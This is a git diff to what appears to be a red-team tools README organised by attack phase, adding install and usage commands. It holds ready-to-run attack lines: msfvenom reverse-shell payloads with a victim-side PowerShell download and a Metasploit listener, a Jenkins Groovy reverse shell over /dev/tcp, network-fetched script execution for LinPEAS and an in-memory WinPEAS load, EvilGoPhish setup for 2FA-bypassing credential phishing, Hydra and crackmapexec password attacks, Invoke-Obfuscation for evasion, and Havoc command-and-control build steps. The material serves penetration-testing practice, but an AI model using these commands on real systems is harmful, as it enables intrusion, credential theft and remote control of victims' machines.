@@ -28,10 +28,10 @@
     - .
 6. [Privilege Escalation](#privilege-escalation)
     - LinPEAS
-    - linux-smart-enumeration
     - WinPEAS
+    - linux-smart-enumeration
 7. [Defense Evasion](#defense-evasion)
-    - .
+    - Invoke-Obfuscation
 8. [Credential Access](#credential-access)
     - .
 9. [Discovery](#discovery)
@@ -44,7 +44,7 @@
     - Forwarding Ports
     - Jenkins reverse shell
 11. [Collection](#collection)
-    - .
+    - BloodHound
 12. [Command and Control](#command-and-control)
     - Havoc
 13. [Exfiltration](#exfiltration)
@@ -64,7 +64,7 @@ Reconnaissance
     - Actively requests each subdomain to verify it's existance ([httprobe](https://github.com/tomnomnom/httprobe))
     - Actively screenshots each subdomain for manual review ([EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness))
     
-    `domain=DOMAIN_COM;rand=$RANDOM;curl -fsSL "https://crt.sh/?q=${domain}" | pup 'td text{}' | grep "${domain}" | sort -n | uniq | httprobe > /tmp/enum_tmp_${rand}.txt; python3 /usr/share/eyewitness/EyeWitness.py -f /tmp/enum_tmp_${rand}.txt --web`
+    **Usage:** `domain=DOMAIN_COM;rand=$RANDOM;curl -fsSL "https://crt.sh/?q=${domain}" | pup 'td text{}' | grep "${domain}" | sort -n | uniq | httprobe > /tmp/enum_tmp_${rand}.txt; python3 /usr/share/eyewitness/EyeWitness.py -f /tmp/enum_tmp_${rand}.txt --web`
     
     *Note: You must have [httprobe](https://github.com/tomnomnom/httprobe), [pup](https://github.com/EricChiang/pup) and [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) installed and change 'DOMAIN_COM' to the target domain. You are able to run this script concurrently in terminal windows if you have multiple target root domains*
 	
@@ -78,7 +78,7 @@ Reconnaissance
 	
 	**Install:** `go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest`
 	
-	**Use:** `cat domains.txt | nuclei -t /PATH/nuclei-templates/`
+	**Usage:** `cat domains.txt | nuclei -t /PATH/nuclei-templates/`
 	
 	![image](https://user-images.githubusercontent.com/100603074/205439027-2afe4ef8-fc7a-410d-934f-f8d325a8176e.png)
 
@@ -88,9 +88,9 @@ Reconnaissance
 	
 	You can set this running with several keywords relating to your victim domain, any certificate creations will be recorded and may lead to the discovery of domains you were previously unaware of.
 	
-	`git clone https://github.com/A-poc/certSniff;cd certSniff/;pip install -r requirements.txt`
+	**Install:** `git clone https://github.com/A-poc/certSniff;cd certSniff/;pip install -r requirements.txt`
 	
-	`python3 certSniff.py -f example.txt`
+	**Usage:** `python3 certSniff.py -f example.txt`
 	
 	![image](https://user-images.githubusercontent.com/100603074/206023792-ef251912-00c0-48e1-8691-71438cf7dd11.png)
 
@@ -99,7 +99,9 @@ Reconnaissance
 
 	Nice tool for brute forcing file/folder paths on a victim website.
 	
-	`gobuster dir -u https://google.com -w /usr/share/wordlists/dirb/big.txt --wildcard -b 301,401,403,404,500 -t 20`
+	**Install:** `sudo apt install gobuster`
+	
+	**Usage:** `gobuster dir -u https://google.com -w /usr/share/wordlists/dirb/big.txt --wildcard -b 301,401,403,404,500 -t 20`
 
 	![image](https://user-images.githubusercontent.com/100603074/192146594-86f04a85-fce3-4c4c-bcd6-2bf6a6222241.png)
 
@@ -107,6 +109,10 @@ Reconnaissance
 * [dnsrecon](https://www.kali.org/tools/dnsrecon/#dnsrecon)
 
 	dnsrecon is a pyhton tool for enumerating DNS records (MX, SOA, NS, A, AAAA, SPF and TXT) and can provide a number of new associated victim hosts to pivot into from a single domain search.
+	
+	**Install:** `sudo apt install dnsrecon`
+	
+	**Usage:** `dnsrecon -d google.com`
 	
 	![image](https://user-images.githubusercontent.com/100603074/191689049-624db340-8adb-4a97-be8d-b7177f409a8b.png)
 
@@ -119,6 +125,10 @@ Reconnaissance
 * [AORT](https://github.com/D3Ext/AORT)
 
 	Tool for enumerating subdomains, enumerating DNS, WAF detection, WHOIS, port scan, wayback machine, email harvesting.
+	
+	**Install:** `git clone https://github.com/D3Ext/AORT; cd AORT; pip3 install -r requirements.txt`
+	
+	**Usage:** `python3 AORT.py -d google.com`
 	
 	![image](https://user-images.githubusercontent.com/100603074/192070398-aae0217d-69c4-460b-ae4c-51b045551268.png)
 
@@ -207,18 +217,44 @@ Initial Access
 * [EvilGoPhish](https://github.com/fin3ss3g0d/evilgophish)
 
 	evilginx2 + gophish. (GoPhish) Gophish is a powerful, open-source phishing framework that makes it easy to test your organization's exposure to phishing. (evilginx2) Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication
+	
+	**Install:** `git clone https://github.com/fin3ss3g0d/evilgophish`
+	
+	**Usage:**
+	
+	```
+	Usage:
+	./setup <root domain> <subdomain(s)> <root domain bool> <redirect url> <feed bool> <rid replacement> <blacklist bool>
+	 - root domain                     - the root domain to be used for the campaign
+	 - subdomains                      - a space separated list of evilginx2 subdomains, can be one if only one
+	 - root domain bool                - true or false to proxy root domain to evilginx2
+	 - redirect url                    - URL to redirect unauthorized Apache requests
+	 - feed bool                       - true or false if you plan to use the live feed
+	 - rid replacement                 - replace the gophish default "rid" in phishing URLs with this value
+	 - blacklist bool                  - true or false to use Apache blacklist
+	Example:
+	  ./setup.sh example.com "accounts myaccount" false https://redirect.com/ true user_id false
+	```
     
 	![image](https://user-images.githubusercontent.com/100603074/191007680-890acda1-72ec-429e-9c91-b2cae55d7189.png)
     
 * [Social Engineer Toolkit (SET)](https://github.com/IO1337/social-engineering-toolkit)
 
 	This framework is great for creating campaigns for initial access, 'SET has a number of custom attack vectors that allow you to make a believable attack quickly'.
+	
+	**Install:** `git clone https://github.com/IO1337/social-engineering-toolkit; cd set; python setup.py install`
+	
+	**Usage:** `python3 setoolkit`
 
 	![image](https://user-images.githubusercontent.com/100603074/191690233-e1f4255a-514e-4887-94da-b8a3396025f0.png)
 
 * [Hydra](https://github.com/vanhauser-thc/thc-hydra)
 
 	Nice tool for logon brute force attacks. Can bf a number of services including SSH, FTP, TELNET, HTTP etc.
+	
+	**Install:** `sudo apt install hydra`
+	
+	**Usage:**
 	
 	```
 	hydra -L USER.TXT -P PASS.TXT 1.1.1.1 http-post-form "login.php:username-^USER^&password=^PASS^:Error"
@@ -230,24 +266,42 @@ Initial Access
 Privilege Escalation
 ====================
 
-* [LinPEAS](https://github.com/carlospolop/PEASS-ng)
+* [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 
 	LinPEAS is a nice verbose privilege escalation for finding local privesc routes on Linux endpoints. 
 	
-	![image](https://user-images.githubusercontent.com/100603074/192070104-8a121544-5c88-4c24-8b2e-590700b345e7.png)
-
-* [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-
-	Linux smart enumeration is another good, less verbose, linux privesc tool for Linux.
+	**Install + Usage:** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
 	
-	![image](https://user-images.githubusercontent.com/100603074/192070258-2fe8727a-4b75-430d-a84e-da6605750de9.png)
-
+	![image](https://user-images.githubusercontent.com/100603074/192070104-8a121544-5c88-4c24-8b2e-590700b345e7.png)
 
 * [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
 
 	WinPEAS is a nice verbose privilege escalation for finding local privesc routes on Windows endpoints. 
 
+	**Install + Usage:** `$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")`
+
 	![image](https://user-images.githubusercontent.com/100603074/192070193-fed8a0e8-b82a-4338-9209-6352f33ab6b8.png)
+
+* [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+
+	Linux smart enumeration is another good, less verbose, linux privesc tool for Linux.
+	
+	**Install + Usage:** `curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh`
+	
+	![image](https://user-images.githubusercontent.com/100603074/192070258-2fe8727a-4b75-430d-a84e-da6605750de9.png)
+
+Defense Evasion
+====================
+
+* [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
+
+	A PowerShell v2.0+ compatible PowerShell command and script obfuscator. If a victim endpoint is able to execute PowerShell then this tool is great for creating heavily obfuscated scripts.
+	
+	**Install:** `git clone https://github.com/danielbohannon/Invoke-Obfuscation.git`
+	
+	**Usage:** `./Invoke-Obfuscation`
+	
+	![image](https://user-images.githubusercontent.com/100603074/206557377-a522ab7a-5803-48b0-8f3e-d7d7b607e692.png)
 
 
 Discovery
@@ -257,11 +311,21 @@ Discovery
 
 	This tool extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface.
 
+	**Install:** `git clone https://github.com/lgandx/PCredz`
+	
+	**Usage:** (PCAP File Folder) `python3 ./Pcredz -d /tmp/pcap-directory-to-parse/`
+	
+	**Usage:** (Live Capture) `python3 ./Pcredz -i eth0 -v`
+
     ![image](https://user-images.githubusercontent.com/100603074/191007004-a0fd01f3-e01f-4bdb-b89e-887c85a7be91.png)
 
 * [PingCastle](https://github.com/vletoux/pingcastle)
 
 	Ping Castle is a tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework. It does not aim at a perfect evaluation but rather as an efficiency compromise.
+
+	**Install:** (Download) `https://github.com/vletoux/pingcastle/releases/download/2.11.0.1/PingCastle_2.11.0.1.zip`
+	
+	**Usage:** `./PingCastle.exe`
 
 	![image](https://user-images.githubusercontent.com/100603074/191008405-39bab2dc-54ce-43d1-aed7-53956776a9ef.png)
 
@@ -271,6 +335,10 @@ Lateral Movement
 * [crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec)
 	
 	This is a great tool for pivoting in a Windows/Active Directory environment using credential pairs (username:password, username:hash). It also offered other features including enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.
+	
+	**Install:** `sudo apt install crackmapexec`
+	
+	**Usage:** `crackmapexec smb <ip address> -d <domain> -u <user list> -p <password list>`
 	
 	![image](https://user-images.githubusercontent.com/100603074/192070626-4549ec06-e2c5-477b-a97d-0f29e48bbfbc.png)
 
@@ -286,15 +354,15 @@ Lateral Movement
 
 	After getting basic shell access to an endpoint a meterpreter is nicer to continue with.
 	
-	[attacker]Generate a meterpreter shell: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe` `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`
+	**[attacker]** Generate a meterpreter shell: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe` `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`
 	
 	![image](https://user-images.githubusercontent.com/100603074/193451669-ff745cf6-e103-4f7e-a266-f7f224dfbb0a.png)
 
-	[victim]Download to victim endpoint: `powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`
+	**[victim]** Download to victim endpoint: `powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`
 	
-	[attacker]Configure listener: `use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run`
+	**[attacker]** Configure listener: `use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run`
 	
-	[victim]Execute payload:`Start-Process "shell-name.exe"`
+	**[victim]** Execute payload:`Start-Process "shell-name.exe"`
 	
 	![image](https://user-images.githubusercontent.com/100603074/193452305-91b769a7-96c4-43d3-b3e2-6e31b3afec27.png)
 
@@ -316,7 +384,21 @@ Lateral Movement
 	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP_ADDRESS/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 	p.waitFor()
 	```
+
+Collection
+====================
+
+* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 	
+	An application used to visualize active directory environments. A quick way to visualise attack paths and understand victims' active directory properties.
+	
+	**Install:** [PenTestPartners Walkthrough](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/)
+	
+	**Custom Queries:** (Download) `https://github.com/CompassSecurity/BloodHoundQueries`
+	
+	![image](https://user-images.githubusercontent.com/100603074/206549387-a63e5f0e-aa75-47f6-b51a-942434648ee2.png)
+
+
 Command and Control
 ====================
 
@@ -325,6 +407,48 @@ Command and Control
 	Havoc is a modern and malleable post-exploitation command and control framework, created by [@C5pider](https://twitter.com/C5pider).
 	
 	Features include: Sleep Obfuscation, x64 return address spoofing, Indirect Syscalls for Nt* APIs
+	
+	**Pre-requisites:** (Ubuntu 20.04 / 22.04)
+	
+	```
+	sudo apt install build-essential
+	sudo add-apt-repository ppa:deadsnakes/ppa
+	sudo apt update
+	sudo apt install python3.10 python3.10-dev
+	```
+	
+	**Build + Usage:**
+	```
+	git clone https://github.com/HavocFramework/Havoc.git
+	cd Havoc/Client
+	make 
+	./Havoc 
+	```
+	
+	**Pre-requisites:** (Ubuntu 20.04 / 22.04)
+	
+	```
+	cd Havoc/Teamserver
+	go mod download golang.org/x/sys  
+	go mod download github.com/ugorji/go
+	```
+	
+	**Build + Usage:**
+	```
+	cd Teamserver
+
+	# Install MUSL C Compiler
+	./Install.sh
+
+	# Build Binary
+	make
+	./teamserver -h
+
+	# Run the teamserver
+	sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
+	```
+	
+	*Full install, build and run instructions on the [wiki](https://github.com/HavocFramework/Havoc/blob/main/WIKI.MD)*
 	
 	![image](https://user-images.githubusercontent.com/100603074/206025215-9c7093e5-b45a-4755-81e6-9e2a52a1f455.png)
 
